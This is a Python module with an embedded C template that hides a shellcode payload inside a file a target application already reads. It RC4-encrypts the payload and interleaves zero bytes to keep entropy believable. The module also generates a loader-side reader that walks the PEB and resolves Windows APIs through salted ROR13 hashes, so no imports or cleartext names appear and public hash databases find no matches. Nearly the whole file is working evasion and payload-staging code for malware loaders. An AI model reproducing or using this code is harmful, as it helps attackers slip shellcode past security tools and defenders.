"""Payload staging inside files the observed job already touched.

After the file-access report, offer to hide the payload (the -s shellcode,
or any file) inside one of the non-PE files the process tree accessed:

  * the user picks a carrier (biggest first) and the app-relative path it
    lives at (``Lib\\somefile.txt`` — auto-computed from the accessing
    process's image);
  * childwatch itself builds the staged copy: RC4-encrypt, interleave with
    zero bytes so the carrier's entropy stays believable, and append blob
    + a 48-byte footer to a COPY of the carrier inside a test mapping
    (``<mapping root>\\Lib\\somefile.txt``).  The original application
    file is never modified;
  * a freestanding ``payload_staged.c`` / ``.h`` is written wherever the
    user wants them.  The reader embeds the RELATIVE carrier path, opens it, re-assembles
    and decrypts the payload into a caller buffer and reports its size.
    Every API is resolved at runtime through a PEB walk and salted
    ROR13-add API hashing — no CRT, no IAT entries, no cleartext names,
    and no constants that hit public hash databases.

Because the reader path is relative, the whole app folder (with its test
mapping) can be relocated without regenerating anything.
"""

import os
import struct
import sys

import questionary
from rich import box
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

from report import console, human_size

STG_MAGIC = 0x31475453                      # "STG1", little-endian
STG_MODE_RAW = 1                            # plain RC4 append
STG_MODE_STRIDE2 = 2                        # RC4 + zero between every byte
STG_FOOTER_FMT = "<II16sIIIQI"             # magic, mode, key, len, blob,
STG_FOOTER_LEN = struct.calcsize(STG_FOOTER_FMT)   # fnv, orig_size, this len


# --------------------------------------------------------------------------
# ROR13-add hashing — same algorithm the generated C reader uses, so the
# constants embedded below can be computed here rather than hand-written.

def _ror32(v: int, r: int) -> int:
    return ((v >> r) | (v << (32 - r))) & 0xFFFFFFFF


def hash_ascii(name: str, seed: int = 0) -> int:
    h = seed
    for ch in name.encode("ascii"):
        h = (_ror32(h, 13) + ch) & 0xFFFFFFFF
    return h


def hash_module(name: str, seed: int = 0) -> int:
    # Module names come from the PEB as UTF-16; hash lower-cased chars.
    h = seed
    for ch in name.lower():
        h = (_ror32(h, 13) + ord(ch)) & 0xFFFFFFFF
    return h


# --------------------------------------------------------------------------
# The standalone staging script.  Tokens (@CARRIER@ etc.) are replaced, not
# .format()ed, so the script's own braces survive.  It deliberately avoids
# anything beyond the standard library.

# --------------------------------------------------------------------------
# Python-side staging primitives — the same RC4 / FNV-1a / footer format
# the generated C reader implements.  childwatch uses these to build and
# verify the staged copy automatically; no helper script is left behind.

def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    out = bytearray()
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = j = 0
    for b in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)


def fnv1a(data: bytes) -> int:
    h = 0x811C9DC5          # 32-bit FNV-1a offset basis (2166136261)
    for b in data:
        h = ((h ^ b) * 0x01000193) & 0xFFFFFFFF
    return h


def _entropy(path: str, cap: int = 1 << 20) -> float:
    """Shannon entropy of the file's first `cap` bytes, in bits/byte."""
    import math
    counts = [0] * 256
    total = 0
    try:
        with open(path, "rb") as f:
            while total < cap:
                chunk = f.read(min(65536, cap - total))
                if not chunk:
                    break
                for b in chunk:
                    counts[b] += 1
                total += len(chunk)
    except OSError:
        return 0.0
    if not total:
        return 0.0
    return -sum((c / total) * math.log2(c / total) for c in counts if c)


def _build_blob(payload: bytes, key: bytes) -> bytes:
    """RC4-encrypt, then zero-interleave: data byte, 0, data, 0, ...
    The RC4 keystream is spent 1:1 on payload bytes only — the interleaved
    zeros never consume it — so de-interleaving in the reader recovers the
    raw RC4 output directly."""
    enc = rc4(key, payload)
    return bytes(v for b in enc for v in (b, 0))


def _pack_footer(key: bytes, payload_len: int, blob_len: int,
                 fnv: int, orig_size: int) -> bytes:
    return struct.pack(STG_FOOTER_FMT, STG_MAGIC, STG_MODE_STRIDE2, key,
                       payload_len, blob_len, fnv, orig_size,
                       STG_FOOTER_LEN)


def _verify_staged(path: str, payload: bytes) -> bool:
    """Read a staged file back and confirm footer + RC4 round trip."""
    try:
        with open(path, "rb") as f:
            f.seek(-STG_FOOTER_LEN, 2)
            magic, mode, key, plen, blen, fnv, orig, flen = \
                struct.unpack(STG_FOOTER_FMT, f.read(STG_FOOTER_LEN))
            f.seek(orig)
            blob = f.read(blen)
        if magic != STG_MAGIC or flen != STG_FOOTER_LEN:
            return False
        if mode == STG_MODE_STRIDE2:
            if blen != 2 * plen or len(blob) != blen:
                return False
            enc = bytes(blob[k] for k in range(0, blen, 2))
        else:
            if blen != plen or len(blob) != blen:
                return False
            enc = blob
        return rc4(key, enc) == payload and fnv1a(payload) == fnv
    except (OSError, struct.error):
        return False


# The loader-side reader.  Freestanding C: no CRT, no imports — kernel32 is
# found through the PEB and each API resolved by ROR13-add hash, so linking
# this object leaves the IAT untouched and puts no API names in the binary.

READER_C_TEMPLATE = r'''/* payload_staged.c — generated by childwatch.
 *
 * Reads back the payload that childwatch appended to a carrier file:
 * footer first (EOF-relative), then the blob in 4 KiB chunks,
 * re-assembling the zero-interleaved bytes and RC4-decrypting on the fly
 * into the caller's buffer.  A FNV-1a checksum over the plaintext is
 * verified before success is reported.
 *
 * Freestanding: no CRT, no IAT entries, no cleartext API names.  kernel32
 * is located by walking the PEB module list; CreateFileW / SetFilePointerEx
 * / GetFileSizeEx / ReadFile / CloseHandle are resolved by ROR13-add hash
 * from its export table.
 */

typedef unsigned char      stg_u8;
typedef unsigned short     stg_u16;
typedef unsigned int       stg_u32;
typedef unsigned long long stg_u64;
typedef unsigned long      stg_ulong;

#define STG_FOOTER_LEN   48u
#define STG_MAGIC        0x31475453u    /* "STG1", little-endian */
#define STG_MODE_RAW     1u             /* blob is raw RC4 output   */
#define STG_MODE_STRIDE2 2u             /* data byte, 0, data, ...  */

/* ROR13-add hashes, computed by the generator (case-insensitive for
 * module names, exact for export names). */
#define STG_HASH_SEED       0x@SEED@u   /* per-build salt: no lookup hits */
#define STG_H_KERNEL32        0x@H_KERNEL32@u
#define STG_H_CreateFileW     0x@H_CreateFileW@u
#define STG_H_SetFilePointerEx 0x@H_SetFilePointerEx@u
#define STG_H_GetFileSizeEx   0x@H_GetFileSizeEx@u
#define STG_H_ReadFile        0x@H_ReadFile@u
#define STG_H_CloseHandle     0x@H_CloseHandle@u

/* Carrier path, RELATIVE to the process working directory — it mirrors
 * the path the app itself uses, so the whole app folder can be moved
 * without touching this.  Override at runtime with
 * stg_read_payload_from(). */
static const stg_u16 kCarrierPath[] = @CARRIER_PATH_C@;

static stg_u32 stg_last_err;

/* ------------------------------------------------------------------ */
/* runtime API resolution                                              */

static stg_u32 stg_ror13_a(const char *s)
{
    stg_u32 h = STG_HASH_SEED;
    while (*s) {
        h = (h >> 13) | (h << 19);
        h += (stg_u8)*s++;
    }
    return h;
}

static stg_u32 stg_ror13_w(const stg_u16 *s)
{
    stg_u32 h = STG_HASH_SEED;
    while (*s) {
        stg_u16 c = *s++;
        if (c >= 65 && c <= 90)      /* A-Z -> a-z */
            c += 32;
        h = (h >> 13) | (h << 19);
        h += c;
    }
    return h;
}

#if defined(_WIN64)
static void *stg_kernel32_base(void)
{
    stg_u8 *peb;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));
    stg_u8 *ldr = *(stg_u8 **)(peb + 0x18);
    if (!ldr)
        return (void *)0;
    stg_u8 *cur = *(stg_u8 **)(ldr + 0x10);   /* InLoadOrderModuleList */
    while (cur != ldr + 0x10) {
        stg_u8   *base = *(stg_u8 **)(cur + 0x30);  /* DllBase       */
        stg_u16  *name = *(stg_u16 **)(cur + 0x60);  /* BaseDllName.Buffer */
        if (base && name && stg_ror13_w(name) == STG_H_KERNEL32)
            return base;
        cur = *(stg_u8 **)cur;
    }
    return (void *)0;
}
#else
static void *stg_kernel32_base(void)
{
    stg_u8 *peb;
    __asm__ volatile ("movl %%fs:0x30, %0" : "=r"(peb));
    stg_u8 *ldr = *(stg_u8 **)(peb + 0x0C);
    if (!ldr)
        return (void *)0;
    stg_u8 *cur = *(stg_u8 **)(ldr + 0x10);
    while (cur != ldr + 0x10) {
        stg_u8   *base = *(stg_u8 **)(cur + 0x18);  /* DllBase       */
        stg_u16  *name = *(stg_u16 **)(cur + 0x30);  /* BaseDllName.Buffer */
        if (base && name && stg_ror13_w(name) == STG_H_KERNEL32)
            return base;
        cur = *(stg_u8 **)cur;
    }
    return (void *)0;
}
#endif

static void *stg_resolve(void *base, stg_u32 name_hash)
{
    stg_u8 *dos = (stg_u8 *)base;
    if (!dos || dos[0] != 'M' || dos[1] != 'Z')
        return (void *)0;
    stg_u8 *nt = dos + *(stg_u32 *)(dos + 0x3C);
    if (*(stg_u32 *)(nt + 0x00) != 0x00004550)   /* "PE\0\0" */
        return (void *)0;
    stg_u8 *opt = nt + 0x18;
#if defined(_WIN64)
    stg_u32 exp_rva = *(stg_u32 *)(opt + 0x70); /* PE32+ DataDir[0] */
#else
    stg_u32 exp_rva = *(stg_u32 *)(opt + 0x60); /* PE32 DataDir[0] */
#endif
    if (!exp_rva)
        return (void *)0;
    stg_u8 *exp = dos + exp_rva;
    stg_u32  n_names = *(stg_u32 *)(exp + 0x18);
    stg_u32 *names   = (stg_u32 *)(dos + *(stg_u32 *)(exp + 0x20));
    stg_u32 *funcs   = (stg_u32 *)(dos + *(stg_u32 *)(exp + 0x1C));
    stg_u16 *ords    = (stg_u16 *)(dos + *(stg_u32 *)(exp + 0x24));
    for (stg_u32 i = 0; i < n_names; i++) {
        const char *n = (const char *)(dos + names[i]);
        if (stg_ror13_a(n) == name_hash)
            return dos + funcs[ords[i]];
    }
    return (void *)0;
}

typedef void *stg_handle;
typedef int  stg_bool;

static stg_handle (*p_CreateFileW)(const stg_u16 *, stg_u32, stg_u32,
                                   void *, stg_u32, stg_u32, stg_handle);
static stg_bool  (*p_SetFilePointerEx)(stg_handle, stg_u64, stg_u64 *,
                                       stg_u32);
static stg_bool  (*p_GetFileSizeEx)(stg_handle, stg_u64 *);
static stg_bool  (*p_ReadFile)(stg_handle, void *, stg_u32, stg_u32 *,
                               void *);
static stg_bool  (*p_CloseHandle)(stg_handle);

static stg_bool stg_apis_ready(void)
{
    if (p_CreateFileW)
        return 1;
    void *k32 = stg_kernel32_base();
    if (!k32) { stg_last_err = 1; return 0; }        /* no kernel32?! */
    p_CreateFileW      = (void *)stg_resolve(k32, STG_H_CreateFileW);
    p_SetFilePointerEx = (void *)stg_resolve(k32, STG_H_SetFilePointerEx);
    p_GetFileSizeEx    = (void *)stg_resolve(k32, STG_H_GetFileSizeEx);
    p_ReadFile         = (void *)stg_resolve(k32, STG_H_ReadFile);
    p_CloseHandle      = (void *)stg_resolve(k32, STG_H_CloseHandle);
    if (!p_CreateFileW || !p_SetFilePointerEx || !p_GetFileSizeEx ||
        !p_ReadFile || !p_CloseHandle) {
        stg_last_err = 1;
        return 0;
    }
    return 1;
}

/* ------------------------------------------------------------------ */
/* RC4 (keystream only; one byte per payload byte regardless of the    */
/* zero interleaving, which never consumes keystream)                  */

typedef struct { stg_u8 S[256]; stg_u8 i, j; } stg_rc4;

static void stg_rc4_init(stg_rc4 *rc, const stg_u8 *key, stg_u32 klen)
{
    for (stg_u32 n = 0; n < 256; n++)
        rc->S[n] = (stg_u8)n;
    rc->i = rc->j = 0;
    stg_u32 j = 0;
    for (stg_u32 n = 0; n < 256; n++) {
        j = (j + rc->S[n] + key[n % klen]) & 0xFF;
        stg_u8 t = rc->S[n]; rc->S[n] = rc->S[j]; rc->S[j] = t;
    }
}

static stg_u8 stg_rc4_byte(stg_rc4 *rc)
{
    rc->i = (rc->i + 1) & 0xFF;
    rc->j = (rc->j + rc->S[rc->i]) & 0xFF;
    stg_u8 t = rc->S[rc->i];
    rc->S[rc->i] = rc->S[rc->j];
    rc->S[rc->j] = t;
    return rc->S[(rc->S[rc->i] + rc->S[rc->j]) & 0xFF];
}

/* ------------------------------------------------------------------ */
/* footer + payload access                                             */

static stg_u32 ld32(const stg_u8 *b, stg_u32 off)
{
    return (stg_u32)b[off] | ((stg_u32)b[off + 1] << 8) |
           ((stg_u32)b[off + 2] << 16) | ((stg_u32)b[off + 3] << 24);
}

static stg_u64 ld64(const stg_u8 *b, stg_u32 off)
{
    return (stg_u64)ld32(b, off) | ((stg_u64)ld32(b, off + 4) << 32);
}

typedef struct {
    stg_u32 mode, payload_len, blob_len, fnv;
    stg_u64 orig_size;
    stg_u8  key[16];
} stg_footer_info;

static stg_bool stg_parse_footer(const stg_u8 *f, stg_footer_info *fi)
{
    if (ld32(f, 0) != STG_MAGIC || ld32(f, 44) != STG_FOOTER_LEN)
        return 0;
    fi->mode        = ld32(f, 4);
    fi->payload_len = ld32(f, 24);
    fi->blob_len    = ld32(f, 28);
    fi->fnv         = ld32(f, 32);
    fi->orig_size   = ld64(f, 36);
    for (int n = 0; n < 16; n++)
        fi->key[n] = f[8 + n];
    if (fi->mode == STG_MODE_STRIDE2) {
        if (fi->blob_len != fi->payload_len * 2u)
            return 0;
    } else if (fi->mode != STG_MODE_RAW || fi->blob_len != fi->payload_len) {
        return 0;
    }
    return fi->payload_len != 0;
}

/* size_only != 0 stops after the footer: the payload length without
 * reading/decrypting the blob. */
static stg_ulong stg_read_internal(const stg_u16 *path, void *out,
                                   stg_ulong cap, int size_only)
{
    stg_last_err = 0;
    if (!stg_apis_ready())
        return 0;

    stg_handle h = p_CreateFileW(path, 0x80000000u,   /* GENERIC_READ  */
                                 0x00000007u,          /* READ|WRITE|DEL*/
                                 (void *)0, 3u,        /* OPEN_EXISTING */
                                 0x00000080u,          /* NORMAL attr   */
                                 (stg_handle)(long long)0);
    if (h == (stg_handle)(long long)-1) { stg_last_err = 2; return 0; }

    stg_u64 fsize = 0;
    stg_u32 got = 0;
    if (!p_GetFileSizeEx(h, &fsize) || fsize < STG_FOOTER_LEN) {
        p_CloseHandle(h); stg_last_err = 3; return 0;
    }

    stg_u8 fbuf[STG_FOOTER_LEN];
    stg_u64 newpos = 0;
    if (!p_SetFilePointerEx(h, fsize - STG_FOOTER_LEN, &newpos, 0u) ||
        !p_ReadFile(h, fbuf, STG_FOOTER_LEN, &got, (void *)0) ||
        got != STG_FOOTER_LEN) {
        p_CloseHandle(h); stg_last_err = 3; return 0;
    }

    stg_footer_info fi;
    if (!stg_parse_footer(fbuf, &fi) ||
        fsize != fi.orig_size + fi.blob_len + STG_FOOTER_LEN) {
        p_CloseHandle(h); stg_last_err = 4; return 0;
    }

    if (size_only) {
        p_CloseHandle(h);
        return fi.payload_len;
    }
    if (cap < fi.payload_len) {
        p_CloseHandle(h); stg_last_err = 7; return 0;
    }

    if (!p_SetFilePointerEx(h, fi.orig_size, &newpos, 0u)) {
        p_CloseHandle(h); stg_last_err = 3; return 0;
    }

    stg_rc4 rc;
    stg_rc4_init(&rc, fi.key, 16);
    stg_u32 fnv = 0x811C9DC5u;       /* 32-bit FNV-1a offset basis */

    stg_u8 chunk[2048];               /* small frame: no stack probe */
    stg_u64 remaining = fi.blob_len;
    stg_u32 out_i = 0;
    while (remaining > 0) {
        stg_u32 want = remaining > sizeof(chunk) ? sizeof(chunk)
                                                 : (stg_u32)remaining;
        if (!p_ReadFile(h, chunk, want, &got, (void *)0) || got != want) {
            p_CloseHandle(h); stg_last_err = 5; return 0;
        }
        remaining -= got;
        for (stg_u32 k = 0; k < got; k++) {
            if (fi.mode == STG_MODE_STRIDE2 && (k & 1))
                continue;                 /* the interleaved zero byte */
            stg_u8 b = chunk[k] ^ stg_rc4_byte(&rc);
            if (out)
                ((stg_u8 *)out)[out_i] = b;
            out_i++;
            fnv = (fnv ^ b) * 0x01000193u;
        }
    }
    p_CloseHandle(h);

    if (fnv != fi.fnv) {
        stg_last_err = 6; return 0;
    }
    return fi.payload_len;
}

/* ------------------------------------------------------------------ */

stg_ulong stg_payload_size(void)
{
    return stg_read_internal(kCarrierPath, (void *)0, 0, 1);
}

stg_ulong stg_read_payload(void *out, stg_ulong cap)
{
    return stg_read_internal(kCarrierPath, out, cap, 0);
}

stg_ulong stg_read_payload_from(const stg_u16 *path, void *out,
                                stg_ulong cap)
{
    return stg_read_internal(path, out, cap, 0);
}

stg_ulong stg_last_error(void)
{
    return stg_last_err;
}
'''

READER_H_TEMPLATE = r'''/* payload_staged.h — generated by childwatch.
 *
 * Loader-side reader for the payload childwatch appended to a carrier
 * file.  Compile and link payload_staged.c: freestanding, no CRT,
 * no imports — safe to call from
 * DllMain-era code that must keep the IAT clean.  Not thread-safe (the
 * RC4 state is stack-local, but the lazily resolved API pointers are a
 * plain static).
 *
 * stg_last_error(): 0 = ok, 1 = API resolve failed, 2 = carrier open
 * failed, 3 = read/seek failed, 4 = footer invalid, 5 = blob read
 * failed, 6 = FNV mismatch (wrong key or corrupted blob), 7 = caller
 * buffer too small.
 */

#ifndef PAYLOAD_STAGED_H
#define PAYLOAD_STAGED_H

/* Payload size in bytes (footer only — no decrypt); 0 on failure. */
unsigned long stg_payload_size(void);

/* Fetch, re-assemble and RC4-decrypt the payload into out (capacity
 * cap); returns the payload size on success, 0 on failure. */
unsigned long stg_read_payload(void *out, unsigned long cap);

/* Same, for any carrier path (wide chars) other than the generated
 * default. */
unsigned long stg_read_payload_from(const unsigned short *path,
                                    void *out, unsigned long cap);

/* Diagnostics for the codes above. */
unsigned long stg_last_error(void);

#endif /* PAYLOAD_STAGED_H */
'''


# --------------------------------------------------------------------------
# Generator

def _c_wide_literal(path: str) -> str:
    """A C wide-string literal for an arbitrary Windows path."""
    return 'L"' + path.replace("\\", "\\\\").replace('"', '\\"') + '"'


def _normalize_rel(rel: str) -> str:
    """Normalize a user/app-relative path: forward slashes to backslashes,
    strip a leading .\\ so it is a clean relative path."""
    rel = rel.strip().strip("\"'").replace("/", "\\")
    while rel.startswith(".\\"):
        rel = rel[2:]
    return rel


def generate_stager(carrier: str, payload_path: str, c_dir: str, h_dir: str,
                    map_root: str, rel_path: str,
                    target_exe: str = "") -> tuple[list[str], dict]:
    """Write payload_staged.c into c_dir and payload_staged.h into h_dir
    (the test mapping copy is what carries the blob),
    and build the test mapping: map_root\\<rel_path> is a COPY of the
    carrier with the encrypted payload appended.  The original carrier is
    never touched, and the reader embeds the RELATIVE path — the whole app
    folder can be relocated without regenerating anything."""
    rel_path = _normalize_rel(rel_path)
    if not rel_path or rel_path.startswith("..\\"):
        raise ValueError(f"relative carrier path {rel_path!r} escapes the "
                         "app folder")

    with open(payload_path, "rb") as f:
        payload = f.read()
    with open(carrier, "rb") as f:
        carrier_bytes = f.read()

    key = os.urandom(16)
    # Per-build hash salt: the plain ROR13 sums of standard API names are
    # in every public hash database, so seed the accumulator randomly for
    # each build.  Both the C constant table and the runtime hash use it.
    salt = 0
    while salt == 0:
        salt = int.from_bytes(os.urandom(4), "little")
    blob = _build_blob(payload, key)
    footer = _pack_footer(key, len(payload), len(blob), fnv1a(payload),
                          len(carrier_bytes))

    os.makedirs(c_dir, exist_ok=True)
    os.makedirs(h_dir, exist_ok=True)

    c = READER_C_TEMPLATE.replace("@SEED@", f"{salt:08x}")
    for token, name in (("@H_KERNEL32@", "kernel32.dll"),
                        ("@H_CreateFileW@", "CreateFileW"),
                        ("@H_SetFilePointerEx@", "SetFilePointerEx"),
                        ("@H_GetFileSizeEx@", "GetFileSizeEx"),
                        ("@H_ReadFile@", "ReadFile"),
                        ("@H_CloseHandle@", "CloseHandle")):
        h = hash_module(name, salt) if "KERNEL32" in token \
            else hash_ascii(name, salt)
        c = c.replace(token, f"{h:08x}")
    c = c.replace("@CARRIER_PATH_C@", _c_wide_literal(rel_path))
    c_path = os.path.join(c_dir, "payload_staged.c")
    with open(c_path, "w", encoding="utf-8", newline="\n") as f:
        f.write(c)

    h_path = os.path.join(h_dir, "payload_staged.h")
    with open(h_path, "w", encoding="utf-8", newline="\n") as f:
        f.write(READER_H_TEMPLATE)

    # The test mapping: mirror of the app-relative layout with the staged
    # copy of the carrier (original bytes + blob + footer).
    map_file = os.path.normpath(os.path.join(map_root, rel_path))
    os.makedirs(os.path.dirname(map_file) or map_root, exist_ok=True)
    replaced = os.path.isfile(map_file)
    with open(map_file, "wb") as f:
        f.write(carrier_bytes)
        f.write(blob)
        f.write(footer)
    verified = _verify_staged(map_file, payload)

    ent_before = _entropy(carrier)
    ent_after = _entropy(map_file)

    arch = "x64"
    if target_exe:
        try:
            import pefile
            with pefile.PE(target_exe, fast_load=True) as pe:
                if pe.FILE_HEADER.Machine == 0x014C:
                    arch = "x86"
        except Exception:
            pass

    created = [c_path, h_path, map_file]
    info = {"carrier": carrier, "payload": payload_path,
            "key_hex": key.hex(), "arch": arch,
            "hash_seed": f"{salt:08x}", "rel_path": rel_path,
            "map_file": map_file, "map_replaced": replaced,
            "verified": verified,
            "entropy_before": ent_before, "entropy_after": ent_after}
    return created, info


# --------------------------------------------------------------------------
# Interactive (or --stage-driven) flow, called after the file-access report

def run_staging_flow(monitor, procs, shellcode: str,
                     stage_flag: str = "", stage_c_flag: str = "",
                     stage_h_flag: str = "", stage_map_flag: str = "",
                     stage_rel_flag: str = "") -> None:
    """Offer to stage the payload inside one of the files the job touched:
    biggest-first picker, then write the reader .c/.h where the user wants
    them and build the test mapping with the payload appended."""
    files: dict[str, int] = {}
    accessor: dict[str, str] = {}
    pid_to_image = {p.pid: p.path for p in procs}
    for a in monitor.accessed_by(procs):
        if a.is_dir or a.is_pe or a.size <= 0:
            continue
        if a.path not in files or a.size > files[a.path]:
            files[a.path] = a.size
        if a.path not in accessor:
            accessor[a.path] = pid_to_image.get(a.pid, "")
    if not files:
        return

    ranked = sorted(files.items(), key=lambda kv: -kv[1])

    if stage_flag:
        carrier = stage_flag
        if not os.path.isfile(carrier):
            console.print(f"[red]error: --stage: no file at {carrier}[/red]")
            return
    else:
        if not sys.stdin.isatty():
            return  # nothing asked for, no terminal to ask on
        if not questionary.confirm(
                "Stage the payload inside one of the files the job "
                "accessed?", default=False, qmark="❯").ask():
            return
        choices = [questionary.Choice(
                       title=f"{human_size(sz):>10}  {p}", value=p)
                   for p, sz in ranked]
        carrier = questionary.select(
            "Carrier file (biggest first):", choices=choices,
            use_search_filter=True, use_jk_keys=False, qmark="❯").ask()
        if carrier is None:
            return

    payload = shellcode
    if not payload:
        if not sys.stdin.isatty():
            console.print("[red]error: staging needs a payload — give one "
                          "with -s/--shellcode[/red]")
            return
        payload = questionary.path("Payload file to stage:",
                                   qmark="❯").ask() or ""
        payload = payload.strip().strip("\"'")
    if not os.path.isfile(payload):
        console.print(f"[red]error: no payload at {payload}[/red]")
        return

    # The carrier path as the APP sees it, relative to the app's own
    # folder — this is what the generated reader embeds, so the app tree
    # can be relocated without regenerating anything.
    base = ""
    img = accessor.get(carrier, "")
    if img:
        base = os.path.dirname(img)
    elif procs and procs[0].path:
        base = os.path.dirname(procs[0].path)
    rel_default = "payload.bin"
    if base:
        try:
            rel_default = os.path.relpath(carrier, base)
        except ValueError:
            pass

    isatty = sys.stdin.isatty()
    if stage_rel_flag:
        rel = stage_rel_flag
    elif isatty:
        rel = questionary.text(
            "Carrier path relative to the app folder:",
            default=rel_default, qmark="❯").ask() or rel_default
    else:
        rel = rel_default
    rel = rel.strip().strip("\"'")

    # Destinations: where the reader .c lives, where the .h lives, and
    # where the test mapping (the app's folder mirror) is created.
    def _ask_folder(msg: str, default: str = "") -> str:
        p = questionary.path(msg, default=default, qmark="❯").ask() or ""
        return p.strip().strip("\"'")

    if stage_c_flag and stage_h_flag and stage_map_flag:
        c_dir, h_dir, map_root = stage_c_flag, stage_h_flag, stage_map_flag
    elif isatty:
        c_dir = _ask_folder("Folder for payload_staged.c:")
        h_dir = _ask_folder("Folder for payload_staged.h (Enter = same "
                            "as the .c):", c_dir) or c_dir
        console.print(f"[dim]test mapping: carrier copy lands at "
                      f"<mapping root>\\{rel.replace('/', chr(92))}[/dim]")
        map_root = _ask_folder(
            "Root folder of the test mapping (the app's folder):")
    else:
        console.print("[red]error: staging needs its destinations — give "
                      "--stage-c DIR, --stage-h DIR and --stage-map DIR "
                      "(--stage-rel PATH overrides the relative carrier "
                      "path)[/red]")
        return
    if not (c_dir and h_dir and map_root):
        console.print("[red]error: staging needs all three destination "
                      "folders (.c, .h, test mapping)[/red]")
        return

    try:
        created, info = generate_stager(
            carrier, payload, c_dir, h_dir, map_root, rel,
            target_exe=procs[0].path if procs else "")
    except ValueError as e:
        console.print(f"[red]error: {e}[/red]")
        return
    except OSError as e:
        console.print(f"[red]error: staging failed: {e}[/red]")
        return

    c_path = created[0]
    h_path = created[1]
    map_file = info["map_file"]

    size_line = ""
    try:
        size_line = (f"\n[dim]payload {human_size(os.path.getsize(payload))}"
                     f" -> blob {human_size(os.path.getsize(payload) * 2)}"
                     f" + 48-byte footer (zero-interleaved RC4)[/dim]")
    except OSError:
        pass
    ent_line = (f"\n[dim]entropy {info['entropy_before']:.3f} -> "
                f"{info['entropy_after']:.3f} bits/byte (first MiB)[/dim]")
    verify_line = ("\n[green]verified: staged copy round-trips "
                   "bit-identical[/green]" if info["verified"] else
                   "\n[red]verified: FAILED — staged copy did not "
                   "round-trip[/red]")
    replaced_line = ("\n[yellow](replaced an existing mapping "
                     "file)[/yellow]" if info["map_replaced"] else "")

    console.print()
    console.print(Panel(
        f"[bold]{os.path.basename(carrier)}[/bold] carries the payload\n"
        f"[dim]original carrier untouched at {carrier}[/dim]"
        f"{replaced_line}{size_line}{ent_line}"
        f"\n[dim]reader: {info['arch']}, freestanding — PEB walk + "
        f"salted ROR13 API hashing, no CRT, no IAT entries; opens "
        f".\\{info['rel_path']} relative to the process CWD[/dim]"
        f"{verify_line}",
        title=Text("STAGING COMPLETE", style="bold green"),
        expand=False))
    table = Table(box=box.SIMPLE, pad_edge=False, show_header=False)
    table.add_column(style="green")
    table.add_column(overflow="fold")
    table.add_row("reader .c", c_path)
    table.add_row("reader .h", h_path)
    table.add_row("staged copy", map_file)
    console.print(table)
    console.print(f"[dim]next: compile payload_staged.c into the loader "
                  f"and call stg_read_payload() — it opens the carrier by "
                  f"its relative path, so place the app in the mapping "
                  f"root and launch it from there (CWD = mapping root) to "
                  f"test[/dim]")
    return created, info
